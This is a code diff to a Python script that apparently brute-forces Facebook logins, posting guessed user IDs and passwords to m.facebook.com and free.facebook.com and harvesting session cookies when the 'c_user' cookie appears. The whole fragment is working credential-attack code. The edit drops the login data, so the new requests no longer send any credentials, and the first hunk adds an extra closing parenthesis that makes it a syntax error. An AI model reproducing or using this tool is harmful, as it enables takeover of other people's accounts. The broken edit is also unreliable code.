@@ -501,7 +501,13 @@ def free1(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
             "user-agent":pro,})
-            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
+            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+
+    cookies=cookies,
+
+    headers=headers,
+
+)).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -615,7 +621,13 @@ def free1(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
             "user-agent":pro,})
-            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
+            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+
+    cookies=cookies,
+
+    headers=headers,
+
+).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -726,7 +738,13 @@ def free1(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
             "user-agent":pro,})
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+
+    cookies=cookies,
+
+    headers=headers,
+
+).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -836,7 +854,13 @@ def free1(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
             "user-agent":pro,})
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+
+    cookies=cookies,
+
+    headers=headers,
+
+).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
